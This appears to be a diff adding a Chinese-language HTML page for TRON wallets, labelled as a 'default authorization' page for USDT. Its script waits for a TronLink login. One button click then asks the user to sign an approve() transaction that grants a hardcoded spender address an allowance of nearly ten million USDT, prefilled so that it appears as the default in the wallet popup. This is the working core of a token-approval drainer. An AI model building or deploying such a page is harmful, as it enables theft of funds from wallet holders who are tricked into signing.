@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TRON USDT 默认授权</title>
+  <style>
+    body { font-family: Arial; padding: 20px; background: #f6f6f6; }
+    input, button { padding: 8px; margin: 5px 0; width: 100%; }
+    button { cursor: pointer; }
+    #status { margin-top: 10px; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<h2>TRON USDT 默认授权页面</h2>
+
+<label>合约地址:</label>
+<input type="text" id="contractAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
+
+<label>授权地址:</label>
+<input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">
+
+<button id="approveBtn">授权最大额度</button>
+
+<div id="status"></div>
+
+<script>
+const MAX_APPROVAL = 9999999; // 默认最大授权额度
+
+async function waitForTronWeb() {
+  while (!window.tronWeb || !tronWeb.ready) {
+    document.getElementById('status').innerText = '等待 TronLink 登录...';
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+  document.getElementById('status').innerText = 'TronLink 已登录!';
+}
+
+async function approveMax() {
+  const contractAddress = document.getElementById('contractAddress').value;
+  const spender = document.getElementById('spenderAddress').value;
+
+  if (!contractAddress || !spender) {
+    alert('请填写完整信息');
+    return;
+  }
+
+  try {
+    const contract = await tronWeb.contract().at(contractAddress);
+    const value = tronWeb.toSun(MAX_APPROVAL); // 固定最大值，钱包弹窗默认显示
+
+    document.getElementById('status').innerText = '等待交易签名...';
+
+    const tx = await contract.approve(spender, value).send({
+      feeLimit: 100_000_000,
+      callValue: 0
+    });
+
+    document.getElementById('status').innerText = '授权成功！交易ID: ' + tx;
+  } catch (e) {
+    console.error(e);
+    document.getElementById('status').innerText = '交易失败: ' + e.message;
+  }
+}
+
+waitForTronWeb();
+document.getElementById('approveBtn').addEventListener('click', approveMax);
+</script>
+
+</body>
+</html>
